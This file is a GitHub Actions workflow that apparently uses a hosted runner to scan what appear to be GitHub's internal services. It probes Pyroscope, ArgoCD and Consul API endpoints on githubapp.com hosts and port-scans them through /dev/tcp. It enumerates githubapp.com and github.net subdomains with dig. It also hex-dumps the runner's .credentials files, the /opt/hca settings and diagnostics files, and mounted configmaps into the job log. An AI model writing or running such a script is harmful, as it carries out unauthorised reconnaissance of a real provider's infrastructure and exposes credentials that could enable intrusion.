name: Internal Services Scan
on:
  workflow_dispatch:
jobs:
  scan:
    runs-on: ubuntu-latest
    steps:
      - name: Probe internal services
        timeout-minutes: 8
        run: |
          set +e
          echo "=== PYROSCOPE ==="
          for path in / /healthz /ready /api/v1/apps /api/v1/labels /api/v1/label-values /render /config; do
            CODE=$(curl -sk --connect-timeout 3 -o /tmp/resp -w "%{http_code}" "https://pyroscope.githubapp.com$path" 2>&1)
            [ "$CODE" != "000" ] && echo "pyroscope$path [$CODE]: $(head -c 300 /tmp/resp)"
          done
          echo ""
          echo "=== ARGOCD ==="
          for path in / /healthz /api/v1/applications /api/v1/clusters /api/v1/repositories /api/v1/session /api/v1/settings /api/version; do
            CODE=$(curl -sk --connect-timeout 3 -o /tmp/resp -w "%{http_code}" "https://argocd.githubapp.com$path" 2>&1)
            [ "$CODE" != "000" ] && echo "argocd$path [$CODE]: $(head -c 300 /tmp/resp)"
          done
          echo ""
          echo "=== CONSUL ==="
          for path in / /v1/agent/self /v1/catalog/services /v1/catalog/nodes /v1/kv/ /v1/status/leader /ui/; do
            CODE=$(curl -sk --connect-timeout 3 -o /tmp/resp -w "%{http_code}" "https://consul.githubapp.com$path" 2>&1)
            [ "$CODE" != "000" ] && echo "consul$path [$CODE]: $(head -c 300 /tmp/resp)"
          done
          echo ""
          echo "=== ALL DISCOVERED SERVICES DEEP ==="
          for host in consul.githubapp.com pyroscope.githubapp.com argocd.githubapp.com; do
            echo "--- $host ports ---"
            for port in 80 443 8080 8443 8500 8300 8301 8302 9090 3000 4040 4100 6443 8081 8082 9411; do
              timeout 1 bash -c "echo >/dev/tcp/$host/$port" 2>/dev/null && echo "$host:$port OPEN"
            done
          done
          echo ""
          echo "=== CONFIGMAP ==="
          ls -laR /mnt/configmap/ 2>/dev/null || echo no configmap
          find /mnt/ -type f 2>/dev/null | head -20
          echo ""
          echo "=== HCA .settings FULL RAW ==="
          xxd /opt/hca/.settings 2>/dev/null | head -40
          echo ""
          echo "=== HCA DIAGNOSTICS.JSON ==="
          xxd /opt/hca/diagnostics.json 2>/dev/null | head -20
          echo ""
          echo "=== RUNNER .credentials RAW ==="
          find /home/runner -name .credentials 2>/dev/null | while read f; do echo $f; xxd $f 2>/dev/null | head -20; done
          echo ""
          echo "=== MORE GITHUBAPP SUBDOMAINS ==="
          for sub in actions-broker actions-token actions-cache-prod actions-results-prod runner-provisioner-prod codespace-provisioner-prod hosted-compute-watchdog-prod hosted-compute-primer-prod observability telemetry analytics metrics sentry datadog newrelic splunk pagerduty opsgenie statuspage; do
            IP=$(dig +short "$sub.githubapp.com" 2>/dev/null | tail -1)
            [ -n "$IP" ] && echo "$sub.githubapp.com -> $IP"
          done
          echo ""
          echo "=== GITHUB.NET SUBDOMAINS ==="
          for sub in admin api internal vpn ssh git lb proxy cache cdn compute runner actions copilot spark; do
            IP=$(dig +short "$sub.github.net" 2>/dev/null | tail -1)
            [ -n "$IP" ] && echo "$sub.github.net -> $IP"
          done
          echo ""
          echo "=== DONE ==="
